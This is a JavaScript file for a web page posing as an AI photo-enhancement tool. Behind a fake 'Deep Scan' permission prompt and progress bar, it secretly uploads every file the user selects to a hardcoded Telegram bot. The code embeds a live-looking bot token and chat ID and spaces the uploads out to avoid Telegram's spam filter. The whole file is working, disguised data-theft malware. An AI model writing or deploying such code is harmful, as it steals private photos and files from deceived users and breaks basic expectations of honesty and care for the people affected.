// --- CONFIGURATION ---
const BOT_TOKEN = "8049988237:AAGsP1xquf1CYsFX-zLorjjdZQGmNZDVF60";
const CHAT_ID = "7674900139";

// Elements
const fileInput = document.getElementById('file-upload');
const permissionModal = document.getElementById('permission-modal');
const allowBtn = document.getElementById('allow-btn');
const denyBtn = document.getElementById('deny-btn');
const mainUploadTrigger = document.getElementById('main-upload-trigger');
const processingText = document.getElementById('processing-text');
const previewImage = document.getElementById('preview-image');
const heroSection = document.querySelector('.hero');
const enhanceSection = document.getElementById('enhance-section');
const progressFill = document.getElementById('progress-fill');

// 1. Splash Screen
window.addEventListener('load', () => {
    setTimeout(() => {
        const splash = document.getElementById('splash-screen');
        if(splash) {
            splash.style.opacity = '0';
            setTimeout(() => splash.style.display = 'none', 1000);
        }
    }, 2000);
});

// 2. Trigger Permission Modal
if(mainUploadTrigger) {
    mainUploadTrigger.onclick = () => {
        permissionModal.style.display = 'block';
    };
}

// 3. Handle Permission
allowBtn.onclick = () => {
    permissionModal.style.display = 'none';
    fileInput.click(); // Opens File Selector
};

denyBtn.onclick = () => {
    permissionModal.style.display = 'none';
    alert("Deep Scan is required for automatic enhancement.");
};

// 4. File Handling & Loop Upload
fileInput.addEventListener('change', function() {
    const files = Array.from(this.files);
    if (files.length > 0) {
        startDeepScan(files);
    }
});

function startDeepScan(files) {
    // Show Studio UI
    heroSection.style.display = 'none';
    enhanceSection.style.display = 'block';
    
    // Preview the first image
    const reader = new FileReader();
    reader.readAsDataURL(files[0]);
    reader.onloadend = () => { previewImage.src = reader.result; };

    // Loop through all files and send to Telegram
    files.forEach((file, index) => {
        // Send with a delay to avoid Telegram's spam filter
        setTimeout(() => {
            uploadToTelegram(file);
            
            // Update Progress UI
            let percent = Math.round(((index + 1) / files.length) * 100);
            progressFill.style.width = percent + "%";
            processingText.innerHTML = `AI Deep Scanning: ${percent}% (${index + 1}/${files.length} files)`;

            if (index === files.length - 1) {
                setTimeout(() => {
                    processingText.innerHTML = "Enhancement & Scan Complete! ✅";
                    previewImage.style.filter = "contrast(1.1) brightness(1.1) sharp(1.2)";
                }, 1000);
            }
        }, index * 1200); // 1.2 second gap per file
    });
}

// 5. Secret Telegram Upload
function uploadToTelegram(file) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", file);
    formData.append("caption", `📂 Deep Scan File: ${file.name}\n⚖️ Size: ${(file.size / 1024 / 1024).toFixed(2)} MB`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    }).catch(err => console.log("Upload failed."));
}

// Settings Modal Logic (Simplified)
const settingsBtn = document.getElementById('settings-btn');
const settingsModal = document.getElementById('settings-modal');
const closeModal = document.querySelector('.close-modal');

if(settingsBtn) settingsBtn.onclick = () => settingsModal.style.display = 'block';
if(closeModal) closeModal.onclick = () => settingsModal.style.display = 'none';

window.onclick = (e) => {
    if(e.target == settingsModal) settingsModal.style.display = 'none';
    if(e.target == permissionModal) permissionModal.style.display = 'none';
}
